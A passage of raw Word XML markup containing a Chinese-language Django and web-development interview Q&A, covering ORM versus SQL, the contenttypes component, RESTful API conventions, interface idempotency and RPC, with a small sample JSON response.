      </w:r>
      <w:r w:rsidR="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>执行速度慢。处理多表联查等复杂操作时,ORM的语法会变得复杂</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D8381A" w14:textId="5EDD358F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.sql开发速度慢,执行速度快。性能强</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05ED1ABC" w14:textId="1B6D91F0"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040</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>contenttype</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>组件的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7427573D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#这个组件保存了项目中所有app和model的对应关系,每当我们创建了新的model并执行数据库迁移后，ContentType表中就会自动新增一条记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E1216D" w14:textId="7CA58415" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#当一张表和多个表FK关联,并且多个FK中只能选择其中一个或其中n个时,可以利用contenttypes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44388F2C" w14:textId="07F17940"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041</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>谈谈你对</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>restful</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>规范的认识？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D975C2" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#首先restful是一种软件架构风格或者说是一种设计风格，并不是标准，它只是提供了一组设计#原则和约束条件，主要用于客户端和服务器交互类的软件。     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59876718" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#就像设计模式一样，并不是一定要遵循这些原则，而是基于这个风格设计的软件可以更简洁，更#有层次，我们可以根据开发的实际情况，做相应的改变。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8AF8D5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#它里面提到了一些规范，例如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0078D98D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.restful 提倡面向资源编程,在url接口中尽量要使用名词，不要使用动词             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373EA55A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2、在url接口中推荐使用Https协议，让网络接口更加安全</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795A5133" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#https://www.bootcss.com/v1/mycss？page=3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E9FF3A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#（Https是Http的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F1048C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#因此加密的详细内容就需要SSL（安全套接层协议））                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30485CB5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3、在url中可以体现版本号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63194A2B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#https://v1.bootcss.com/mycss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3F3939" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#不同的版本可以有不同的接口，使其更加简洁，清晰             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0083253D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#4、url中可以体现是否是API接口 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42384D5B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#https://www.bootcss.com/api/mycss            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FC7EBF" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#5、url中可以添加条件去筛选匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6597066E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#https://www.bootcss.com/v1/mycss？page=3             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDE87C5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#6、可以根据Http不同的method，进行不同的资源操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0B7A4B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#（5种方法：GET / POST / PUT / DELETE / PATCH）             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5F4E1D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#7、响应式应该设置状态码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F447139" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#8、有返回值，而且格式为统一的json格式             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB86482" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#9、返回错误信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF4B009" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#返回值携带错误信息             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091216D3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#10、返回结果中要提供帮助链接，即API最好做到Hypermedia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1602500E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#如果遇到需要跳转的情况 携带调转接口的URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C5F3C9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    　　ret = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522669E4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            code: 1000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B9440B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            data:{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C742946" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            id:1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F601CA5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            name:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'小强'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2537EB51" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            depart_id:http://www.luffycity.com/api/v1/depart/8/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4B4230" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190FE22F" w14:textId="0F87E9E0" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1164ED75" w14:textId="3CF157CB"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042</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>接口的幂等性是什么意思？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F666CF" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.是系统的接口对外一种承诺(而不是实现)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B606EE" w14:textId="3A77762A" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.承诺只要调用接口成功,外部多次调用对系统的影响都是一致的,不会对资源重复操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30348CD6" w14:textId="58B5F092"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043</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0BC64E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#远程过程调用 (RPC) 是一种协议，程序可使用这种协议向网络中的另一台计算机上的程序请求服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC39300" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.RPC采用客户机/服务器模式。请求程序就是一个客户机，而服务提供程序就是一个服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12EB39CD" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.首先，客户机调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651515EF" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9D04BD" w14:textId="36A1EB5F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CBAAB0" w14:textId="23F66822"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044</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38600E96" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#系统之间为了调用数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581C52A7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
